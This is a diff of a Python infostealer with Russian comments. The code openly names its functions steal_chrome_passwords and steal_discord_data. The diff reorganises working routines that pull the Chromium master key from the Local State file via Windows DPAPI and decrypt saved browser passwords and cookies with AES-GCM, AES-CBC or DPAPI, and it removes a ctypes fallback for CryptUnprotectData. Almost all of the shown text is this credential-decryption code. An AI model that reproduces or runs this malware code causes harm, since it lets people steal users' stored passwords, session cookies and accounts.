@@ -20,60 +20,6 @@ import sys
 from pathlib import Path
 from Cryptodome.Cipher import AES
 import traceback
-import ctypes
-from ctypes import wintypes, byref, POINTER, create_string_buffer, c_void_p
-
-# =============================================
-# ДОБАВЛЕННЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С CTYPES
-# =============================================
-
-def setup_crypt_unprotect_data():
-    """Настройка структур для CryptUnprotectData через ctypes"""
-    class DATA_BLOB(ctypes.Structure):
-        _fields_ = [
-            ('cbData', wintypes.DWORD),
-            ('pbData', ctypes.POINTER(ctypes.c_byte))
-        ]
-    
-    def crypt_unprotect_data(encrypted_data, entropy=None):
-        blob_in = DATA_BLOB()
-        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.POINTER(ctypes.c_byte))
-        blob_in.cbData = len(encrypted_data)
-        
-        blob_out = DATA_BLOB()
-        flags = 0x01  # CRYPTPROTECT_UI_FORBIDDEN
-        
-        if entropy:
-            entropy_blob = DATA_BLOB()
-            entropy_blob.pbData = ctypes.cast(ctypes.create_string_buffer(entropy), ctypes.POINTER(ctypes.c_byte))
-            entropy_blob.cbData = len(entropy)
-            entropy_ptr = byref(entropy_blob)
-        else:
-            entropy_ptr = None
-        
-        if ctypes.windll.crypt32.CryptUnprotectData(
-            byref(blob_in),
-            None,
-            entropy_ptr,
-            None,
-            None,
-            flags,
-            byref(blob_out)
-        ):
-            decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-            return decrypted_data
-        return None
-    
-    return crypt_unprotect_data
-
-# Инициализация функции
-crypt_unprotect_data_ctypes = None
-if platform.system() == "Windows":
-    try:
-        crypt_unprotect_data_ctypes = setup_crypt_unprotect_data()
-    except Exception as e:
-        pass
 
 # Исправленный импорт для Windows-специфичных модулей
 if platform.system() == "Windows":
@@ -129,213 +75,6 @@ def debug_log(message):
             f.write(f"[{timestamp}] {message}\n")
     except Exception as e:
         print(f"Ошибка записи в лог: {e}")
-
-# =============================================
-# УЛУЧШЕННЫЕ ФУНКЦИИ ДЕШИФРОВКИ
-# =============================================
-
-def get_encryption_key(profile_path):
-    """Получает ключ шифрования с поиском Local State в родительской папке"""
-    debug_log(f"Поиск ключа для: {profile_path}")
-    
-    if platform.system() != "Windows":
-        debug_log("Платформа не Windows")
-        return None
-    
-    # Поиск Local State в возможных расположениях
-    possible_paths = [
-        Path(profile_path) / "Local State",
-        Path(profile_path).parent / "Local State",
-        Path(profile_path).parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent.parent / "Local State"
-    ]
-    
-    local_state_path = None
-    for path in possible_paths:
-        if path.exists():
-            local_state_path = path
-            debug_log(f"Найден Local State: {path}")
-            break
-    
-    if not local_state_path:
-        debug_log(f"Файл Local State не найден для: {profile_path}")
-        return None
-    
-    try:
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.loads(f.read())
-        
-        # Проверка наличия ключа os_crypt
-        if "os_crypt" not in local_state:
-            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
-            return None
-            
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        if len(encrypted_key) < 5:
-            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
-            return None
-            
-        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
-        
-        # Пробуем разные методы дешифровки ключа
-        key = None
-        try:
-            # Метод 1: win32crypt
-            if HAS_WIN32CRYPT:
-                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                debug_log("Ключ получен через win32crypt")
-            # Метод 2: ctypes
-            elif crypt_unprotect_data_ctypes:
-                key = crypt_unprotect_data_ctypes(encrypted_key)
-                debug_log("Ключ получен через ctypes")
-        except Exception as e:
-            debug_log(f"Ошибка дешифровки ключа: {e}")
-        
-        if key:
-            debug_log(f"Ключ успешно получен ({len(key)} байт)")
-            return key
-        
-        debug_log("Все методы дешифровки ключа не сработали")
-        return None
-    except Exception as e:
-        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
-        return None
-
-def decrypt_chromium_value(encrypted_value, key):
-    """Улучшенная расшифровка значений для Chromium с расширенной диагностикой"""
-    try:
-        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
-        
-        # Если значение пустое
-        if not encrypted_value:
-            debug_log("Пустое значение")
-            return ""
-        
-        # Если это не байты
-        if not isinstance(encrypted_value, bytes):
-            debug_log("Не байтовое значение")
-            return encrypted_value
-        
-        # Для Windows: попробовать DPAPI
-        if platform.system() == "Windows":
-            try:
-                # Метод 1: win32crypt
-                if HAS_WIN32CRYPT:
-                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
-                # Метод 2: ctypes
-                elif crypt_unprotect_data_ctypes:
-                    decrypted = crypt_unprotect_data_ctypes(encrypted_value)
-                else:
-                    decrypted = None
-                
-                if decrypted:
-                    try:
-                        result = decrypted.decode('utf-8')
-                        debug_log("Успешная дешифровка через DPAPI")
-                        return result
-                    except UnicodeDecodeError:
-                        result = decrypted.decode('latin-1')
-                        debug_log("Успешная дешифровка через DPAPI (latin-1)")
-                        return result
-            except Exception as e:
-                debug_log(f"Ошибка DPAPI: {str(e)}")
-        
-        # Проверка наличия ключа
-        if not key:
-            debug_log("Ключ дешифровки отсутствует")
-            return base64.b64encode(encrypted_value).decode('utf-8')
-        
-        # Обработка AES-GCM (v10/v11)
-        if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
-            debug_log("Обнаружен формат v10 (AES-GCM)")
-            try:
-                nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:-16]
-                tag = encrypted_value[-16:]
-                
-                debug_log(f"Данные GCM: nonce={len(nonce)} ciphertext={len(ciphertext)} tag={len(tag)}")
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
-                
-                try:
-                    result = plaintext.decode('utf-8')
-                    debug_log("Успешная дешифровка GCM")
-                    return result
-                except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после GCM")
-                    return plaintext.decode('latin-1', errors='ignore')
-            except Exception as e:
-                debug_log(f"Ошибка GCM: {str(e)}")
-                # Попробовать без тега для старых версий
-                try:
-                    nonce = encrypted_value[3:15]
-                    ciphertext = encrypted_value[15:]
-                    
-                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                    plaintext = cipher.decrypt(ciphertext)
-                    
-                    try:
-                        return plaintext.decode('utf-8')
-                    except:
-                        return plaintext.decode('latin-1', errors='ignore')
-                except Exception as e2:
-                    debug_log(f"Ошибка GCM без тега: {str(e2)}")
-        
-        # Обработка AES-CBC (старые версии)
-        if len(encrypted_value) > 16:
-            debug_log("Попытка дешифровки CBC")
-            try:
-                # Для CBC используем первые 16 байт как IV
-                iv = encrypted_value[:16]
-                ciphertext = encrypted_value[16:]
-                
-                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-                plaintext = cipher.decrypt(ciphertext)
-                
-                # Удаляем PKCS7 padding
-                padding_length = plaintext[-1]
-                plaintext = plaintext[:-padding_length]
-                
-                try:
-                    result = plaintext.decode('utf-8')
-                    debug_log("Успешная дешифровка CBC")
-                    return result
-                except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после CBC")
-                    return plaintext.decode('latin-1', errors='ignore')
-            except Exception as e:
-                debug_log(f"Ошибка CBC: {str(e)}")
-        
-        # Последняя попытка: DPAPI для Windows
-        if platform.system() == "Windows":
-            try:
-                if HAS_WIN32CRYPT:
-                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
-                elif crypt_unprotect_data_ctypes:
-                    decrypted = crypt_unprotect_data_ctypes(encrypted_value)
-                else:
-                    decrypted = None
-                
-                if decrypted:
-                    try:
-                        return decrypted.decode('utf-8')
-                    except UnicodeDecodeError:
-                        return decrypted.decode('latin-1')
-            except:
-                pass
-        
-        # Если ничего не сработало, вернуть как base64
-        debug_log("Все методы дешифровки не сработали, возвращаем base64")
-        return base64.b64encode(encrypted_value).decode('utf-8')
-            
-    except Exception as e:
-        debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
-        try:
-            return base64.b64encode(encrypted_value).decode('utf-8')
-        except:
-            return "DECRYPTION_ERROR"
 
 # =============================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES
@@ -661,6 +400,181 @@ def steal_discord_data():
     if stolen_data:
         with open(discord_dir / "file_list.json", "w") as f:
             json.dump(stolen_data, f)
+
+def get_encryption_key(profile_path):
+    """Получает ключ шифрования с поиском Local State в родительской папке"""
+    debug_log(f"Поиск ключа для: {profile_path}")
+    
+    if platform.system() != "Windows" or not HAS_WIN32CRYPT:
+        debug_log("Платформа не Windows или win32crypt недоступен")
+        return None
+    
+    # Поиск Local State в возможных расположениях
+    possible_paths = [
+        Path(profile_path) / "Local State",
+        Path(profile_path).parent / "Local State",
+        Path(profile_path).parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent.parent / "Local State"
+    ]
+    
+    local_state_path = None
+    for path in possible_paths:
+        if path.exists():
+            local_state_path = path
+            debug_log(f"Найден Local State: {path}")
+            break
+    
+    if not local_state_path:
+        debug_log(f"Файл Local State не найден для: {profile_path}")
+        return None
+    
+    try:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+        
+        # Проверка наличия ключа os_crypt
+        if "os_crypt" not in local_state:
+            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
+            return None
+            
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        if len(encrypted_key) < 5:
+            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
+            return None
+            
+        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
+        try:
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            debug_log(f"Ключ успешно получен ({len(key)} байт)")
+            return key
+        except Exception as e:
+            debug_log(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
+            return None
+    except Exception as e:
+        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
+        return None
+
+def decrypt_chromium_value(encrypted_value, key):
+    """Улучшенная расшифровка значений для Chromium с расширенной диагностикой"""
+    try:
+        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
+        
+        # Если значение пустое
+        if not encrypted_value:
+            debug_log("Пустое значение")
+            return ""
+        
+        # Если это не байты
+        if not isinstance(encrypted_value, bytes):
+            debug_log("Не байтовое значение")
+            return encrypted_value
+        
+        # Для Windows: попробовать DPAPI
+        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+            try:
+                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                if decrypted:
+                    try:
+                        result = decrypted.decode('utf-8')
+                        debug_log("Успешная дешифровка через DPAPI")
+                        return result
+                    except UnicodeDecodeError:
+                        result = decrypted.decode('latin-1')
+                        debug_log("Успешная дешифровка через DPAPI (latin-1)")
+                        return result
+            except Exception as e:
+                debug_log(f"Ошибка DPAPI: {str(e)}")
+        
+        # Проверка наличия ключа
+        if not key:
+            debug_log("Ключ дешифровки отсутствует")
+            return base64.b64encode(encrypted_value).decode('utf-8')
+        
+        # Обработка AES-GCM (v10/v11)
+        if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
+            debug_log("Обнаружен формат v10 (AES-GCM)")
+            try:
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                
+                debug_log(f"Данные GCM: nonce={len(nonce)} ciphertext={len(ciphertext)} tag={len(tag)}")
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+                
+                try:
+                    result = plaintext.decode('utf-8')
+                    debug_log("Успешная дешифровка GCM")
+                    return result
+                except UnicodeDecodeError:
+                    debug_log("Ошибка декодирования UTF-8 после GCM")
+                    return plaintext.decode('latin-1', errors='ignore')
+            except Exception as e:
+                debug_log(f"Ошибка GCM: {str(e)}")
+                # Попробовать без тега для старых версий
+                try:
+                    nonce = encrypted_value[3:15]
+                    ciphertext = encrypted_value[15:]
+                    
+                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                    plaintext = cipher.decrypt(ciphertext)
+                    
+                    try:
+                        return plaintext.decode('utf-8')
+                    except:
+                        return plaintext.decode('latin-1', errors='ignore')
+                except Exception as e2:
+                    debug_log(f"Ошибка GCM без тега: {str(e2)}")
+        
+        # Обработка AES-CBC (старые версии)
+        if len(encrypted_value) > 16:
+            debug_log("Попытка дешифровки CBC")
+            try:
+                # Для CBC используем первые 16 байт как IV
+                iv = encrypted_value[:16]
+                ciphertext = encrypted_value[16:]
+                
+                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+                plaintext = cipher.decrypt(ciphertext)
+                
+                # Удаляем PKCS7 padding
+                padding_length = plaintext[-1]
+                plaintext = plaintext[:-padding_length]
+                
+                try:
+                    result = plaintext.decode('utf-8')
+                    debug_log("Успешная дешифровка CBC")
+                    return result
+                except UnicodeDecodeError:
+                    debug_log("Ошибка декодирования UTF-8 после CBC")
+                    return plaintext.decode('latin-1', errors='ignore')
+            except Exception as e:
+                debug_log(f"Ошибка CBC: {str(e)}")
+        
+        # Последняя попытка: DPAPI для Windows
+        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+            try:
+                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                if decrypted:
+                    try:
+                        return decrypted.decode('utf-8')
+                    except UnicodeDecodeError:
+                        return decrypted.decode('latin-1')
+            except:
+                pass
+        
+        # Если ничего не сработало, вернуть как base64
+        debug_log("Все методы дешифровки не сработали, возвращаем base64")
+        return base64.b64encode(encrypted_value).decode('utf-8')
+            
+    except Exception as e:
+        debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
+        try:
+            return base64.b64encode(encrypted_value).decode('utf-8')
+        except:
+            return "DECRYPTION_ERROR"
 
 def steal_chrome_passwords(browser_name, profile_path):
     """Крадет пароли из браузеров на основе Chromium"""
